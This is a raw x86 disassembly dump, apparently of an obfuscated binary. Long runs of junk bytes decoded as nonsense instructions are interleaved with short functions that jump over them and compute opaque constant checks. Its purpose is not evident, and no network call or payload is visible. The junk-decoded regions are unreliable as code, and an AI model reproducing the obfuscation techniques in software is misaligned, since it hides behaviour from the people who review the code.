  410cbf:	div    BYTE PTR [esi+eax*8]
  410cc2:	jno    0x410cc9
  410cc4:	xchg   DWORD PTR [ebx+0x56],eax
  410cc7:	retf   0xa163
  410cca:	iret   
  410ccb:	or     DWORD PTR [edi-0x55],esi
  410cce:	push   0xb7167af5
  410cd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410cd4:	or     bl,dh
  410cd6:	repz xor al,0xea
  410cd9:	mov    bh,0x5a
  410cdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410cdc:	sahf   
  410cdd:	mov    ds,edi
  410cdf:	inc    esi
  410ce0:	adc    BYTE PTR [esi-0x4e],0x74
  410ce4:	xlat   BYTE PTR ds:[ebx]
  410ce5:	scas   al,BYTE PTR es:[edi]
  410ce6:	call   0x5ada13a4
  410ceb:	in     al,dx
  410cec:	stos   DWORD PTR es:[edi],eax
  410ced:	mov    eax,ds:0xb864cdd5
  410cf2:	push   eax
  410cf3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410cf4:	pop    ebp
  410cf5:	adc    eax,0x6a7c2fe1
  410cfa:	dec    edx
  410cfb:	iret   
  410cfc:	addr16 call 0x1f7beafb
  410d02:	inc    edx
  410d03:	xchg   ebp,eax
  410d04:	outs   dx,DWORD PTR ds:[esi]
  410d05:	inc    ebp
  410d06:	mov    DWORD PTR [esi],0x22c60541
  410d0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d0d:	cmp    BYTE PTR [ecx],bh
  410d0f:	jnp    0x410d41
  410d11:	mov    ds:0x1b7ed720,eax
  410d16:	mov    dh,0xfa
  410d18:	and    bh,BYTE PTR [esi+0x53482ab0]
  410d1e:	in     eax,0x83
  410d20:	mov    WORD PTR es:[ebp-0x5ae06a63],fs
  410d27:	mov    eax,0x31b5aa25
  410d2c:	xchg   BYTE PTR [ebx+0x7908b03b],ah
  410d32:	cmp    ch,BYTE PTR [edi+0x1a34b136]
  410d38:	jno    0x410cda
  410d3a:	lock fisub DWORD PTR [ecx+0x61]
  410d3e:	xor    esi,esp
  410d40:	ja     0x410d6d
  410d42:	xchg   esi,esi
  410d44:	loope  0x410cfd
  410d46:	neg    ebp
  410d48:	out    dx,eax
  410d49:	jle    0x410d25
  410d4b:	imul   edx,DWORD PTR [ecx+0x1a6b5ec8],0xb606e2de
  410d55:	xchg   esp,eax
  410d56:	jmp    0x410d2a
  410d58:	sahf   
  410d59:	test   al,dh
  410d5b:	test   BYTE PTR [edi],0xfb
  410d5e:	jecxz  0x410cea
  410d60:	out    dx,eax
  410d61:	xlat   BYTE PTR ds:[ebx]
  410d62:	mov    DWORD PTR ds:0xc5186c24,esp
  410d68:	pop    ebp
  410d69:	shr    DWORD PTR [edx-0x54],0xe2
  410d6d:	pop    edi
  410d6e:	xchg   DWORD PTR [edi+eax*4],edx
  410d71:	outs   dx,DWORD PTR ds:[esi]
  410d72:	mov    dl,0x12
  410d74:	mov    cl,0xa
  410d76:	mov    dl,0x28
  410d78:	retf   
  410d79:	out    0xb5,eax
  410d7b:	lea    eax,[ebx+edx*1-0x55]
  410d7f:	popa   
  410d80:	xor    al,0x1
  410d82:	inc    edi
  410d83:	cmc    
  410d84:	test   BYTE PTR [ebp+0x20],al
  410d87:	aam    0x94
  410d89:	cmp    edi,edx
  410d8b:	mov    al,bl
  410d8d:	xlat   BYTE PTR ds:[ebx]
  410d8e:	retf   
  410d8f:	repnz xor DWORD PTR [ebx+0x7829cc58],ebx
  410d96:	cwde   
  410d97:	sbb    BYTE PTR [edx-0x6c],cl
  410d9a:	mov    al,0xaa
  410d9c:	mov    ch,BYTE PTR [ecx-0x55]
  410d9f:	mov    dh,0x40
  410da1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410da2:	fxch   st(4)
  410da4:	jnp    0x410e25
  410da6:	(bad)  [ebp+0x16c90b34]
  410dac:	enter  0xb32d,0x0
  410db0:	(bad)  
  410db1:	push   ecx
  410db2:	push   edi
  410db3:	clc    
  410db4:	shr    DWORD PTR [eax+0x722c02c9],cl
  410dba:	test   al,0xeb
  410dbc:	sub    al,0x6d
  410dbe:	into   
  410dbf:	test   BYTE PTR [edx-0x3b],ah
  410dc2:	push   0x400a6016
  410dc7:	and    ch,BYTE PTR ds:0x3dc01f29
  410dcd:	mov    ebp,0x683507bc
  410dd2:	sub    al,0xe7
  410dd4:	jmp    0xcfd7:0x8851
  410dda:	mov    dl,0xe4
  410ddc:	hlt    
  410ddd:	sbb    DWORD PTR [eax],ebx
  410ddf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410de0:	sub    BYTE PTR [ecx+ebx*1+0x647fd87e],0xb6
  410de8:	cld    
  410de9:	or     DWORD PTR [ebx-0x22],0x5b045089
  410df0:	leave  
  410df1:	ret    0x8
  410df4:	push   ebp
  410df5:	mov    ebp,esp
  410df7:	sub    esp,0x3c
  410dfa:	mov    DWORD PTR [ebp-0x20],0x3510
  410e01:	mov    DWORD PTR [ebp-0x1c],0x2104
  410e08:	mov    DWORD PTR [ebp-0x18],0x5d15
  410e0f:	mov    DWORD PTR [ebp-0x14],0x30cd
  410e16:	mov    DWORD PTR [ebp-0x10],0x1709
  410e1d:	mov    DWORD PTR [ebp-0xc],0x260b
  410e24:	jmp    0x4110ab
  410e29:	jo     0x410db5
  410e2b:	fldl2e 
  410e2d:	cmp    al,0xb9
  410e2f:	jo     0x410dcd
  410e31:	out    0x46,eax
  410e33:	mov    ah,BYTE PTR [ecx+ecx*1+0x3b927a59]
  410e3a:	dec    edx
  410e3b:	mov    esi,0xbec289be
  410e40:	mov    esi,0xdabb0c27
  410e45:	push   esi
  410e46:	cdq    
  410e47:	sbb    DWORD PTR [ecx-0x6],edi
  410e4a:	dec    esi
  410e4c:	sbb    DWORD PTR ds:0x7656b3f9,ebx
  410e52:	cmp    BYTE PTR [eax],dl
  410e54:	scas   eax,DWORD PTR es:[edi]
  410e55:	das    
  410e56:	pop    ss
  410e57:	jnp    0x410df4
  410e59:	cmp    DWORD PTR [esi+ebp*1],0x40
  410e5d:	xchg   DWORD PTR [edx+eax*4-0x5e],ecx
  410e61:	hlt    
  410e62:	test   eax,esi
  410e64:	mov    edx,0x62a0420c
  410e69:	sub    dl,cl
  410e6b:	stc    
  410e6c:	fucom  st(3)
  410e6e:	loop   0x410ed7
  410e70:	clc    
  410e71:	add    eax,0xfe988fb3
  410e76:	test   eax,0xec228832
  410e7b:	push   eax
  410e7c:	adc    edx,DWORD PTR [ebx+edx*8-0x1f274735]
  410e83:	retf   0x4cbf
  410e86:	sbb    DWORD PTR [esi-0x31fbf349],esp
  410e8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e8d:	lahf   
  410e8e:	in     al,0x37
  410e90:	les    ecx,FWORD PTR [ebp-0x4c]
  410e93:	dec    edx
  410e94:	adc    eax,0xfd6e0163
  410e99:	rol    BYTE PTR [ecx-0x45],1
  410e9c:	cli    
  410e9d:	jecxz  0x410eb5
  410e9f:	dec    ebp
  410ea0:	inc    ah
  410ea2:	push   edx
  410ea3:	bound  ecx,QWORD PTR [eax+0x7c6841d1]
  410ea9:	fcmovnb st,st(7)
  410eab:	mov    eax,ds:0x319f1d18
  410eb0:	lahf   
  410eb1:	sbb    bh,BYTE PTR [esi]
  410eb3:	out    0x8d,eax
  410eb5:	clc    
  410eb6:	adc    ecx,DWORD PTR [edi]
  410eb8:	xchg   BYTE PTR [ebx-0x27f43677],bh
  410ebe:	cmc    
  410ebf:	xor    esp,DWORD PTR [esi-0x18]
  410ec2:	cmp    eax,0x9b2bcb7e
  410ec7:	xor    al,0xde
  410ec9:	rcr    esp,1
  410ecb:	sub    al,0x3a
  410ecd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ece:	jmp    0x668:0x99f1f03a
  410ed5:	mov    BYTE PTR [eax-0x47b9d6f8],bh
  410edb:	rcr    DWORD PTR [ebx-0x49],1
  410ede:	pop    ebp
  410edf:	leave  
  410ee0:	inc    ebx
  410ee1:	aad    0xcc
  410ee3:	or     ebp,DWORD PTR [eax]
  410ee5:	lds    ebx,FWORD PTR [edx+0x15]
  410ee8:	inc    esi
  410ee9:	pop    ecx
  410eea:	int    0x69
  410eec:	xor    al,0x72
  410eee:	inc    eax
  410eef:	lods   eax,DWORD PTR ds:[esi]
  410ef0:	pop    ds
  410ef1:	adc    bl,BYTE PTR [esp+edx*4+0x7d4db04b]
  410ef8:	popf   
  410ef9:	fwait
  410efa:	mov    ecx,0x41d6855f
  410eff:	aaa    
  410f00:	test   al,0x92
  410f02:	(bad)  
  410f03:	js     0x410f5c
  410f05:	lahf   
  410f06:	test   BYTE PTR [ebx-0x71],ah
  410f09:	xor    al,0x5d
  410f0b:	or     ecx,DWORD PTR [ebx-0x48]
  410f0e:	outs   dx,DWORD PTR ds:[esi]
  410f0f:	pop    ss
  410f10:	retf   0xdee6
  410f13:	push   ebx
  410f14:	leave  
  410f15:	into   
  410f16:	rcl    BYTE PTR [ecx-0x11],cl
  410f19:	push   es
  410f1a:	mov    dl,0x58
  410f1c:	sahf   
  410f1d:	xchg   ecx,eax
  410f1e:	cmp    al,0x4c
  410f20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f21:	add    edx,ebp
  410f23:	data16 int 0xc1
  410f26:	scas   eax,DWORD PTR es:[edi]
  410f27:	mov    cl,0xec
  410f29:	push   esp
  410f2a:	sub    DWORD PTR [edx+ebp*8-0x73e8b74b],ebx
  410f31:	jnp    0x410f56
  410f33:	jae    0x410f67
  410f35:	jp     0x410f6a
  410f37:	fs scas eax,DWORD PTR es:[edi]
  410f39:	repz das 
  410f3b:	ins    DWORD PTR es:[edi],dx
  410f3c:	ffreep st(2)
  410f3e:	std    
  410f3f:	pop    esp
  410f40:	rol    ch,cl
  410f42:	mov    ch,0x75
  410f44:	or     BYTE PTR [ecx-0x6],al
  410f47:	out    dx,eax
  410f48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f49:	js     0x410f8b
  410f4b:	or     DWORD PTR fs:[edi-0x7f],0x7f
  410f50:	sub    eax,0x8ba7b255
  410f55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f56:	jo     0x410f49
  410f58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f59:	mov    ecx,ss
  410f5b:	inc    ecx
  410f5c:	mov    edx,0x4fc83f9
  410f61:	push   ebx
  410f62:	add    al,0x5a
  410f64:	ins    DWORD PTR es:[edi],dx
  410f65:	mov    ah,0x73
  410f67:	and    eax,0xb1f79f40
  410f6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f6d:	push   ss
  410f6e:	jns    0x410f63
  410f70:	dec    edi
  410f71:	ret    
  410f72:	icebp  
  410f73:	push   edi
  410f74:	add    DWORD PTR [ecx],edx
  410f76:	das    
  410f77:	sbb    esp,DWORD PTR [edi]
  410f79:	out    0xec,eax
  410f7b:	mov    ebp,0xbdb86396
  410f80:	(bad)  
  410f81:	test   bh,0xe
  410f84:	popf   
  410f85:	sub    dl,BYTE PTR [esi+0x24]
  410f88:	test   eax,0xed69fed4
  410f8d:	das    
  410f8e:	js     0x410f19
  410f90:	mov    ebp,DWORD PTR [ebp-0x77]
  410f93:	jnp    0x410f30
  410f95:	je     0x410fc0
  410f97:	add    DWORD PTR [edi+0x3279594d],0xffffffd5
  410f9e:	pop    eax
  410f9f:	nop
  410fa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410fa1:	call   0x9137fe5f
  410fa6:	xchg   ebx,eax
  410fa7:	cli    
  410fa8:	xchg   ecx,eax
  410fa9:	cdq    
  410faa:	xchg   ch,ah
  410fac:	ins    DWORD PTR es:[edi],dx
  410fad:	push   ebx
  410fae:	ins    BYTE PTR es:[edi],dx
  410faf:	dec    ebp
  410fb0:	(bad)  
  410fb1:	scas   eax,DWORD PTR es:[edi]
  410fb2:	fistp  DWORD PTR [edx]
  410fb4:	xor    al,BYTE PTR [ebx]
  410fb6:	ror    BYTE PTR [esp+ebp*8],1
  410fb9:	push   edx
  410fba:	and    DWORD PTR [ecx],edi
  410fbc:	popf   
  410fbd:	push   0xc46b1cd4
  410fc2:	int    0xf0
  410fc4:	inc    eax
  410fc5:	or     al,BYTE PTR ds:0xf03c4651
  410fcb:	in     al,0x44
  410fcd:	sub    dh,BYTE PTR [esi-0x4d4e5db9]
  410fd3:	xor    al,0x1b
  410fd5:	mov    ah,0x8f
  410fd7:	(bad)  
  410fd8:	cmp    al,0xba
  410fda:	lods   al,BYTE PTR ds:[esi]
  410fdb:	pop    ecx
  410fdc:	mov    esi,0xbf697775
  410fe1:	mov    bh,0x26
  410fe3:	adc    eax,0xb3aa683b
  410fe8:	das    
  410fe9:	mov    cl,ah
  410feb:	sbb    al,0x4d
  410fed:	aad    0x3b
  410fef:	aam    0xa5
  410ff1:	mov    dl,0xc5
  410ff3:	add    al,0x7b
  410ff5:	aas    
  410ff6:	popa   
  410ff7:	adc    DWORD PTR [edx-0x5a],edi
  410ffa:	and    ah,BYTE PTR [edx+0x77846f65]
  411000:	lock and eax,0x6886c30e
  411006:	(bad)  
  411007:	xor    cl,BYTE PTR [ebx-0x14]
  41100a:	js     0x411050
  41100c:	xor    BYTE PTR [ebx+0x308cd40],0x9c
  411013:	int    0xeb
  411015:	das    
  411016:	adc    esi,DWORD PTR ds:0xf2dd30f1
  41101c:	jbe    0x411033
  41101e:	mov    dl,0x28
  411020:	mov    edx,0x2096a221
  411025:	cmc    
  411026:	or     al,0x56
  411028:	or     dh,BYTE PTR [ebx]
  41102a:	das    
  41102b:	rol    ah,1
  41102d:	sar    BYTE PTR [edx+0x7c46e6e1],0xa8
  411034:	call   0xfd5b7f6a
  411039:	in     al,dx
  41103a:	pop    edx
  41103b:	mov    edi,0x69803d5e
  411040:	push   ds
  411041:	jne    0x411023
  411043:	push   ecx
  411044:	ret    0x49b0
  411047:	fsub   QWORD PTR [edi-0x5ed64868]
  41104d:	mov    ch,0x9a
  41104f:	mov    DWORD PTR [edi],edi
  411051:	adc    DWORD PTR [eax],esi
  411053:	push   esp
  411054:	dec    ebp
  411055:	push   edi
  411056:	ss mov edi,0x740e781
  41105c:	adc    ah,BYTE PTR [eax-0xb42f923]
  411062:	dec    ebx
  411063:	mov    esi,DWORD PTR [ebx+0x41]
  411066:	mov    ebp,0xc5d12561
  41106b:	into   
  41106c:	(bad)  
  41106d:	xor    al,0x1d
  41106f:	aad    0x1a
  411071:	pop    ebp
  411072:	jmp    DWORD PTR [ebx-0x23a463b8]
  411078:	jbe    0x411045
  41107a:	out    0x66,al
  41107c:	fisub  DWORD PTR [edx]
  41107e:	bound  eax,QWORD PTR [esi+edi*2]
  411081:	xor    DWORD PTR [ebp+0x9489cc1],ecx
  411087:	jb     0x4110e3
  411089:	sub    BYTE PTR [ebx],dh
  41108b:	fdivr  st(5),st
  41108d:	xchg   edx,eax
  41108e:	(bad)
  411091:	shl    BYTE PTR [ecx],cl
  411093:	sti    
  411094:	mov    dl,0x2b
  411096:	dec    eax
  411097:	dec    esp
  411098:	jne    0x411104
  41109a:	dec    ebp
  41109b:	adc    dl,ch
  41109d:	test   dl,ah
  41109f:	dec    edi
  4110a1:	inc    esi
  4110a2:	(bad)  
  4110a3:	jno    0x411025
  4110a5:	mov    al,BYTE PTR [ecx-0x1913c4bf]
  4110ab:	mov    DWORD PTR [ebp-0x8],0x3204
  4110b2:	mov    DWORD PTR [ebp-0x4],0x62ea
  4110b9:	mov    DWORD PTR [ebp-0x38],0x58e9
  4110c0:	jmp    0x411347
  4110c5:	pop    edx
  4110c6:	daa    
  4110c7:	fcomp  QWORD PTR [eax-0x44]
  4110ca:	mov    esp,0xf3ba2b5a
  4110cf:	aad    0xe3
  4110d1:	jmp    0xbe4e:0x8d15616
  4110d8:	mov    esi,0xbebec289
  4110dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110de:	sbb    esp,DWORD PTR ds:0xc1557d9
  4110e4:	inc    edi
  4110e5:	imul   ecx,DWORD PTR [ebp+0x47],0x4521a907
  4110ec:	push   0x63377eb0
  4110f1:	mov    dh,0xd3
  4110f3:	repz mov edi,ecx
  4110f6:	mov    ecx,0x81290931
  4110fb:	xchg   esi,eax
  4110fc:	lock inc ebx
  4110fe:	sub    BYTE PTR [ebx-0x10183ac2],ah
  411104:	xchg   ecx,eax
  411105:	and    DWORD PTR [esi],edx
  411107:	jge    0x4110d1
  411109:	or     BYTE PTR [ecx+0x1b],dl
  41110c:	in     al,dx
  41110d:	(bad)  ds:0x7a34f4ec
  411113:	retf   0x9b6c
  411116:	mov    dh,0x5
  411118:	inc    esi
  411119:	call   FWORD PTR [edx+ebp*4-0x25]
  41111d:	mov    ecx,0xf7efacdc
  411122:	lods   eax,DWORD PTR ds:[esi]
  411123:	push   esp
  411124:	and    DWORD PTR [ecx],ecx
  411126:	adc    DWORD PTR [ecx-0x75],esi
  411129:	jb     0x411143
  41112b:	mov    ah,0x5c
  41112d:	or     eax,0x17a07539
  411132:	xchg   BYTE PTR [ebx+0x1d],dh
  411135:	sub    ebx,DWORD PTR ds:[edi-0x7bf2a8c2]
  41113c:	or     DWORD PTR [ebx+0x40],ebx
  41113f:	fild   QWORD PTR [ecx+0x7b]
  411142:	fsub   QWORD PTR [esi-0x18]
  411145:	sub    al,BYTE PTR [eax+0x1b312aa5]
  41114b:	mov    edi,0xcafe1dc
  411150:	cwde   
  411151:	xor    al,0x6
  411153:	pop    edi
  411154:	sub    eax,0x22cc693f
  411159:	popf   
  41115a:	repnz cld 
  41115c:	out    dx,al
  41115d:	in     eax,0xec
  41115f:	push   edx
  411160:	ja     0x4110ea
  411162:	das    
  411163:	test   eax,0x125bdc7a
  411168:	xlat   BYTE PTR ds:[ebx]
  411169:	inc    ecx
  41116a:	in     eax,dx
  41116b:	fidiv  WORD PTR [ecx-0x44]
  41116e:	fs mov eax,0x41f4dacd
  411174:	dec    esi
  411175:	repz popf 
  411177:	push   0x30
  411179:	pusha  
  41117a:	inc    eax
  41117b:	sbb    edi,DWORD PTR [edi]
  41117d:	pop    ss
  41117e:	jns    0x4111aa
  411180:	adc    DWORD PTR [ebx-0x15e87bb1],esp
  411186:	fist   WORD PTR [ecx-0x63]
  411189:	rcr    esi,cl
  41118b:	(bad)  
  41118c:	in     al,dx
  41118d:	ret    
  41118e:	xchg   edx,eax
  41118f:	xor    DWORD PTR [eax-0x71666903],ebp
  411195:	stos   DWORD PTR es:[edi],eax
  411196:	test   BYTE PTR [edi+0x65568b52],al
  41119c:	sbb    DWORD PTR [edx],ecx
  41119e:	inc    esi
  41119f:	mov    edx,0xf67c3075
  4111a4:	adc    eax,0xb2560dfe
  4111a9:	sbb    edi,DWORD PTR [edi+0x63]
  4111ac:	and    al,0x7a
  4111ae:	jmp    0x7599f56
  4111b3:	rol    DWORD PTR [edx],1
  4111b5:	sub    eax,0xd4225392
  4111ba:	inc    eax
  4111bb:	xchg   ebp,edi
  4111bd:	push   0xb52fe16
  4111c2:	movntq QWORD PTR [eax],mm5
  4111c5:	cdq    
  4111c6:	lods   eax,DWORD PTR ds:[esi]
  4111c7:	lahf   
  4111c8:	pushf  
  4111c9:	mov    DWORD PTR [eax],0xedf63303
  4111cf:	pop    ds
  4111d0:	call   0x14339446
  4111d5:	cmp    edi,ecx
  4111d7:	mov    eax,ds:0x7d5360e
  4111dc:	xchg   DWORD PTR [edx],esp
  4111de:	pop    edx
  4111df:	mov    ecx,0xf4f42c96
  4111e4:	jns    0x411199
  4111e6:	fisttp QWORD PTR [ebx+0x76]
  4111e9:	mov    cl,0x45
  4111eb:	in     eax,dx
  4111ec:	sbb    al,0x14
  4111ee:	xor    bl,BYTE PTR [ecx]
  4111f0:	fisub  DWORD PTR [edi-0x50b8bf29]
  4111f6:	(bad)  
  4111f7:	ret    0xf369
  4111fa:	rcl    BYTE PTR [eax+0x3c],0xc2
  4111fe:	mov    dl,al
  411200:	and    DWORD PTR [esi+0x21b10e7b],esi
  411206:	push   ebx
  411207:	jmp    FWORD PTR [edi]
  411209:	shl    BYTE PTR [eax-0x1d],0x7b
  41120d:	(bad)  
  41120f:	xor    eax,0x51bb4a21
  411214:	inc    ebp
  411215:	icebp  
  411216:	je     0x4111b4
  411218:	xchg   esp,eax
  41121a:	shr    DWORD PTR [esi+ebx*1+0x106e8cb6],0xe
  411222:	inc    bx
  411224:	and    al,0x7f
  411226:	add    ah,BYTE PTR [ecx-0x4d]
  411229:	pop    edx
  41122a:	test   BYTE PTR [eax],ch
  41122c:	push   esi
  41122d:	repnz inc esp
  41122f:	jle    0x411265
  411231:	add    BYTE PTR [edi+0x1381e8f3],dl
  411237:	jecxz  0x4111eb
  411239:	popf   
  41123a:	inc    eax
  41123b:	xor    eax,0x44765a31
  411240:	pop    eax
  411241:	add    BYTE PTR [ebp+0x72355294],dl
  411247:	cmp    BYTE PTR [ecx-0x25],ah
  41124a:	mov    esp,0x449db69e
  41124f:	push   0xd457371f
  411254:	imul   ebx,DWORD PTR [edi+edi*2-0xf5c608a],0xfa10bbeb
  41125f:	push   es
  411260:	mov    al,ds:0xf6413071
  411265:	loopne 0x4112db
  411267:	enter  0x2127,0xb3
  41126b:	cwde   
  41126c:	and    edi,esi
  41126e:	sahf   
  41126f:	adc    dh,BYTE PTR [eax+0x6ae4a4f6]
  411275:	mov    bl,BYTE PTR [ecx]
  411277:	outs   dx,BYTE PTR ds:[esi]
  411278:	jp     0x411249
  41127a:	or     BYTE PTR [ecx+0x23],bl
  41127d:	push   ss
  41127e:	gs jae 0x411276
  411281:	cld    
  411282:	frstor [ebp+0x60]
  411285:	cmp    DWORD PTR [eax*1+0x652b663e],edi
  41128c:	fadd   QWORD PTR [ecx+0x593e9ad]
  411292:	test   al,0xfe
  411294:	add    cl,BYTE PTR [esi+ecx*8-0x603af79f]
  41129b:	jb     0x4112e8
  41129d:	outs   dx,DWORD PTR ds:[esi]
  41129e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41129f:	push   ds
  4112a0:	or     ah,BYTE PTR [edx+ebp*8+0x3fd76bed]
  4112a7:	fmul   QWORD PTR [edx+0x40]
  4112aa:	and    ah,BYTE PTR [edx]
  4112ac:	pop    ss
  4112ad:	fidiv  DWORD PTR [esi+0x2a47012c]
  4112b3:	dec    esi
  4112b4:	jmp    0x3095:0xb8d53a17
  4112bb:	cmp    eax,0xa199b470
  4112c0:	test   al,0xcb
  4112c2:	mov    ebp,0x77fa3e56
  4112c7:	dec    edx
  4112c8:	pop    ebp
  4112c9:	jmp    0x4112a6
  4112cb:	xchg   edi,eax
  4112cc:	in     al,0x99
  4112ce:	out    0xbf,eax
  4112d0:	mov    al,0xa1
  4112d2:	xlat   BYTE PTR ds:[ebx]
  4112d3:	clc    
  4112d4:	cmp    ch,BYTE PTR [esi-0x5d]
  4112d7:	int    0xa3
  4112d9:	(bad)  
  4112db:	add    DWORD PTR [edx],edi
  4112dd:	test   DWORD PTR [eax+0x29],esi
  4112e0:	aam    0x2f
  4112e2:	xchg   ecx,eax
  4112e3:	pop    eax
  4112e4:	cmp    al,0xc8
  4112e6:	stc    
  4112e7:	lock push ebp
  4112e9:	pushf  
  4112ea:	cmp    edx,esp
  4112ec:	cmp    ebp,DWORD PTR [ebx-0x24]
  4112ef:	cmc    
  4112f0:	jmp    0x3b7d4f7f
  4112f5:	mov    esp,0x2e6644bd
  4112fa:	jnp    0x411309
  4112fc:	dec    ebx
  4112fd:	mov    ds:0xbdd4d5b6,eax
  411302:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411303:	sub    eax,0x6bf95d3d
  411308:	test   al,0x95
  41130a:	fnsave [ebp+0x4e]
  41130d:	push   edi
  41130e:	adc    al,0xb8
  411310:	js     0x411376
  411312:	lock stos BYTE PTR es:[edi],al
  411314:	mov    ebx,0x72986b3a
  411319:	mov    ds:0x8fde5a6d,eax
  41131e:	es js  0x4112fa
  411321:	xor    ebx,edi
  411323:	add    al,BYTE PTR [eax]
  411325:	xlat   BYTE PTR ds:[ebx]
  411326:	arpl   bx,di
  411328:	dec    eax
  411329:	and    esi,edx
  41132b:	jp     0x411318
  41132d:	sub    DWORD PTR [ecx+esi*4-0x4e],edi
  411331:	inc    esp
  411332:	sub    BYTE PTR [ecx-0x59],ah
  411335:	mov    al,dh
  411337:	shr    DWORD PTR [esi],0x8
  41133a:	imul   edx,DWORD PTR [ebx],0x9ebfc510
  411340:	xchg   edi,eax
  411341:	lock jmp 0x411377
  411344:	int    0x1f
  411346:	add    bh,0x45
  411349:	int3   
  41134a:	mov    DWORD PTR [edi+0x0],edi
  41134d:	add    bh,al
  41134f:	inc    ebp
  411350:	rcr    dl,1
  411352:	jg     0x411354
  411354:	add    bh,al
  411356:	inc    ebp
  411357:	aam    0x89
  411359:	sub    BYTE PTR [eax],al
  41135b:	add    bh,al
  41135d:	inc    ebp
  41135e:	fmul   DWORD PTR [edi]
  411360:	sldt   WORD PTR [eax]
  411363:	mov    DWORD PTR [ebp-0x24],0x58e1
  41136a:	mov    DWORD PTR [ebp-0x3c],0x69c
  411371:	mov    eax,DWORD PTR [ebp-0x10]
  411374:	mov    ecx,DWORD PTR [ebp-0x14]
  411377:	and    al,0xb9
  411379:	add    al,cl
  41137b:	mov    ecx,DWORD PTR [ebp-0x18]
  41137e:	and    al,cl
  411380:	mov    ecx,DWORD PTR [ebp-0x1c]
  411383:	sub    al,0x11
  411385:	and    al,cl
  411387:	mov    ecx,DWORD PTR [ebp-0x20]
  41138a:	mov    edx,DWORD PTR [ebp+0x8]
  41138d:	imul   ecx,ecx,0x6008
  411393:	add    ecx,0x1759dd6e
  411399:	add    al,0x4d
  41139b:	xor    ecx,0x2b4185ee
  4113a1:	cmp    BYTE PTR [ecx+edx*1],al
  4113a4:	jne    0x41143e
  4113aa:	mov    ecx,DWORD PTR [ebp-0x4]
  4113ad:	mov    eax,0xffffeff8
  4113b2:	mov    edx,eax
  4113b4:	sub    edx,ecx
  4113b6:	add    edx,DWORD PTR [ebp-0x8]
  4113b9:	mov    ecx,DWORD PTR [ebp-0xc]
  4113bc:	or     edx,ecx
  4113be:	mov    ecx,DWORD PTR [ebp-0x4]
  4113c1:	imul   edx,edx,0x85300
  4113c7:	sub    eax,ecx
  4113c9:	add    eax,DWORD PTR [ebp-0x8]
  4113cc:	mov    ecx,DWORD PTR [ebp-0xc]
  4113cf:	or     eax,ecx
  4113d1:	mov    ecx,DWORD PTR [ebp+0x8]
  4113d4:	mov    ecx,DWORD PTR [edx+ecx*1+0x1c323f3c]
  4113db:	add    eax,0x40e5
  4113e0:	imul   eax,eax,0x214c
  4113e6:	add    eax,ecx
  4113e8:	mov    ecx,DWORD PTR [ebp+0x8]
  4113eb:	add    ecx,eax
  4113ed:	mov    DWORD PTR [ebp+0x8],ecx
  4113f0:	mov    eax,DWORD PTR [ebp-0x24]
  4113f3:	mov    ecx,DWORD PTR [ebp-0x28]
  4113f6:	and    eax,ecx
  4113f8:	mov    ecx,DWORD PTR [ebp-0x2c]
  4113fb:	and    eax,ecx
  4113fd:	mov    ecx,DWORD PTR [ebp-0x30]
  411400:	imul   eax,ecx
  411403:	mov    ecx,DWORD PTR [ebp-0x34]
  411406:	or     eax,ecx
  411408:	mov    ecx,DWORD PTR [ebp-0x38]
  41140b:	imul   eax,ecx
  41140e:	mov    ecx,DWORD PTR [ebp+0x8]
  411411:	sub    eax,0x777ea653
  411416:	cmp    DWORD PTR [ecx+0x54],eax
  411419:	je     0x411427
  41141f:	mov    eax,DWORD PTR [ebp+0x8]
  411422:	jmp    0x41146e
  411427:	mov    eax,DWORD PTR [ebp-0x3c]
  41142a:	sub    eax,0x5258
  41142f:	xor    eax,0x49e9
  411434:	add    eax,0x253
  411439:	jmp    0x41146e
  41143e:	mov    DWORD PTR [ebp-0x3c],0x4177
  411445:	mov    DWORD PTR [ebp+0x8],0x1405
  41144c:	mov    eax,DWORD PTR [ebp+0x8]
  41144f:	mov    ecx,DWORD PTR [ebp-0x3c]
  411452:	imul   eax,eax,0x58cc
  411458:	add    eax,0x3f39
  41145d:	and    eax,ecx
  41145f:	add    eax,0x3b90
  411464:	or     eax,0x4b1c
  411469:	sub    eax,0x7fdd
  41146e:	leave  
  41146f:	ret    0x4
  411472:	push   ebp
  411473:	mov    ebp,esp
  411475:	and    esp,0xfffffff8
  411478:	sub    esp,0x20
  41147b:	push   ebx
  41147c:	push   esi
  41147d:	lea    eax,[esp+0x10]
  411481:	mov    DWORD PTR [esp+0xc],eax
  411485:	mov    eax,DWORD PTR [esp+0xc]
  411489:	mov    ecx,DWORD PTR [esp+0x10]
  41148d:	mov    edx,DWORD PTR [esp+0x14]
  411491:	sub    DWORD PTR [eax],ecx
  411493:	sbb    DWORD PTR [eax+0x4],edx
  411496:	mov    eax,DWORD PTR [esp+0xc]
  41149a:	or     DWORD PTR [eax],0xcb7db576
  4114a0:	or     DWORD PTR [eax+0x4],0x9c2b8ae8
  4114a7:	lea    eax,[esp+0x18]
  4114ab:	jmp    0x41183a
  4114b0:	test   al,0x7c
  4114b2:	or     BYTE PTR [esp+ebx*1-0x44],ch
  4114b6:	lods   al,BYTE PTR ds:[esi]
  4114b7:	mov    esp,0x92465201
  4114bc:	cmp    DWORD PTR [eax+0x54d4dd34],edi
  4114c2:	mov    esi,0xbec499be
  4114c7:	mov    esi,0x8c909365
  4114cc:	sahf   
  4114cd:	and    DWORD PTR [esi],ebp
  4114cf:	adc    al,0xc
  4114d1:	mov    bh,0xe7
  4114d3:	inc    esp
  4114d4:	add    eax,0xb5d51cc8
  4114d9:	(bad)  
